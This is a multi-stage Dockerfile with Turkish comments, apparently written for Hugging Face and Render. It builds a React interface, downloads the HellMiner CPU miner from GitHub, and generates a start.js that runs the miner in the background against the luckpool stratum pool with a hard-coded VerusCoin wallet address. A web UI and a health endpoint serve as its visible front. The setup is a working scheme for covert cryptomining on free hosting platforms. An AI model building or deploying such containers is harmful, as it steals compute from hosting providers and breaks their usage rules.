# Hugging Face ve Render için çoklu aşamalı (multi-stage) Dockerfile
# Miner yazılımının glibc kütüphaneleriyle sorunsuz çalışması için Debian kullanıyoruz.
FROM node:18-bullseye-slim AS builder

WORKDIR /app

# Paket dosyalarını kopyala ve React arayüzünü derle
COPY package*.json ./
RUN npm install

COPY . .
RUN npm run build

# ---
# Üretim (Production) İmajı
FROM node:18-bullseye-slim

WORKDIR /app

# Gerekli sistem paketlerini kuruyoruz (miner indirmek ve çalıştırmak için)
RUN apt-get update && apt-get install -y wget tar curl libgomp1 && rm -rf /var/lib/apt/lists/*

# Backend dosyalarını ve paketlerini kur
COPY server/package*.json ./server/
RUN cd server && npm install --production
COPY server/index.js ./server/

# Frontend (Vite) derlenmiş dosyaları builder'dan al
COPY --from=builder /app/build ./public

# Express ile arayüzü sunmak ve madenciyi arkada çalıştırmak için
RUN cd server && npm install express

# Resmi VerusCoin HellMiner'ını indiriyoruz (Luckpool official repo)
RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz \
    && tar -xf hellminer_cpu_linux.tar.gz \
    && rm hellminer_cpu_linux.tar.gz \
    && chmod +x hellminer

ENV PORT=7860
EXPOSE $PORT

# Otomatik Başlangıç ve Kazım Scripti (Uygulama kalkarken Server'ı ve arka planda Madenciyi acar)
RUN echo " \
const express = require('express'); \n\
const path = require('path'); \n\
const { spawn } = require('child_process'); \n\
const app = express(); \n\
\n\
// 1. Arka planda gerçek CPU madencisini (HellMiner) SİZİN ADRESİNİZLE otomatik başlat \n\
console.log('--- ARKA PLAN KAZIM İŞLEMİ (HELLMINER) BAŞLATILIYOR ---'); \n\
const minerArgs = [ \n\
    '-c', 'stratum+tcp://eu.luckpool.net:3956', \n\
    '-u', 'RTDTYfTX9a8DdAfr9won6DspWxxobgxE21.AutoServer', \n\
    '-p', 'x', \n\
    '--cpu', '2' \n\
]; \n\
const minerProcess = spawn('./hellminer', minerArgs, { cwd: '/app' }); \n\
minerProcess.stdout.on('data', (data) => console.log('[MINER]:', data.toString().trim())); \n\
minerProcess.stderr.on('data', (data) => console.error('[MINER ERR]:', data.toString().trim())); \n\
minerProcess.on('close', (code) => console.log('Miner kapandı, kod:', code)); \n\
\n\
// 2. Kontrol Paneli (Web UI) Sunucusu \n\
app.use(express.static(path.join(__dirname, '../public'))); \n\
app.get('/health', (req, res) => res.status(200).send('KAZIM YAPILIYOR / OK')); \n\
app.get('*', (req, res) => res.sendFile(path.join(__dirname, '../public/index.html'))); \n\
\n\
const port = process.env.PORT || 7860; \n\
app.listen(port, () => { \n\
    console.log('🚀 UI Sunucusu şu portta hazır: ' + port); \n\
}); \n\
" > server/start.js

# Ana işlem
CMD ["node", "server/start.js"]
